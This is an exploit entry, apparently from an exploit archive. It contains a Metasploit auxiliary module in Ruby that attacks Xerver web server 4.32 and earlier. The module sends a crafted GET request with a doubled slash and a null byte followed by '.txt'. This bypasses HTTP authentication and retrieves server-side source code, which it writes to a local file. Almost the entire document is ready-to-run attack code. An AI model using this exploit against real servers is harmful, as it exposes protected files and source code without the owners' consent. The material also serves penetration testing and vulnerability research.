Xerver 4.32 Source Disclosure and HTTP Authentication Bypass
============================================================


# Exploit Title: Xerver Source Disclosure and HTTP Auth Bypass
# Date: 01 Aug 2010
# Author: Ben Schmidt aka supernothing
# Software: http://www.javascript.nu/xerver/
# Version: 4.32 and prior
# Tested on: Windows XP SP3
# CVE: N/A
 
 
##
# This file is derived from part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Auxiliary
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Auxiliary::Report
    include Msf::Auxiliary::Scanner
 
    def initialize
        super(
            &#039;Name&#039;           => &#039;Xerver Source Code Disclosure/Download, Authentication Bypass&#039;,
            &#039;Version&#039;        => &#039;$Revision: 1 $&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a source code disclosure/download vulnerability in
                versions of the Xerver web server up to and including version 4.32. It also
                incorporates an authentication bypass vulnerability that allows you to dump
                the source of files in HTTP auth protected directories as well.
            },
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;&#039; ],
                    [ &#039;OSVDB&#039;, &#039;&#039; ],
                    [ &#039;BID&#039;, &#039;&#039; ],
                    [&#039;URL&#039;,&#039;http://spareclockcycles.org/2010/08/01/multiple-vulnerabilities-in-xerver-4-32/&#039;]
                ],
            &#039;Author&#039;         =>
                [
                    #Vulnerability discovered by:
                    &#039;supernothing&#039;,
                    #Module based on nginx source disclosure code by:
                    &#039;Alligator Security Team&#039;,
                    &#039;Tiago Ferreira <tiago.ccna[at]gmail.com>&#039;,
                ],
            &#039;License&#039;        =>  MSF_LICENSE)
 
        register_options(
            [
                OptString.new(&#039;URI&#039;, [true, &#039;Specify the path to download the file (ex: admin.php)&#039;, &#039;/admin.php&#039;]),
                OptString.new(&#039;PATH_SAVE&#039;, [true, &#039;The path to save the downloaded source code&#039;, &#039;&#039;]),
            ], self.class)
    end
 
    def target_url
        "http://#{vhost}:#{rport}#{datastore[&#039;URI&#039;]}"
    end
 
    def run_host(ip)
        uri = datastore[&#039;URI&#039;]
        path_save = datastore[&#039;PATH_SAVE&#039;]
 
        vuln_versions = [
            "Xerver/4.32",#Others definitely vulnerable, add as needed
        ]
 
        begin
            res = send_request_raw(
                {
                    &#039;method&#039;  => &#039;GET&#039;,
                    &#039;uri&#039;     => "//#{uri}\x00.txt", #extra forward slash for breaking password protection
                }, 25)
 
            if res
                version = res.headers[&#039;Server&#039;]
                http_fingerprint({ :response => res })
            end
             
            if vuln_versions.include?(version)
                print_good("#{target_url} - Xerver - Vulnerable version: #{version}")
 
                if (res and res.code == 200)
 
                    print_good("#{target_url} - Xerver - Getting the source of page #{uri}")
 
                    save_source = File.new("#{path_save}#{uri}","w")
                    save_source.puts(res.body.to_s)
                    save_source.close
 
                    print_status("#{target_url} - Xerver - File successfully saved: #{path_save}#{uri}")    if (File.exists?("#{path_save}#{uri}"))
 
                else
                    print_error("http://#{vhost}:#{rport} - Xerver - Unrecognized #{res.code} response")
                    return
 
                end
 
            else
                if version =~ /Xerver/
                    print_error("#{target_url} - Xerver - Cannot exploit: the remote server is not vulnerable - Version #{version}")
                else
                    print_error("#{target_url} - Xerver - Cannot exploit: the remote server is not Xerver")
                end
                return
 
            end
 
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
        rescue ::Timeout::Error, ::Errno::EPIPE
        end
    end
 
end



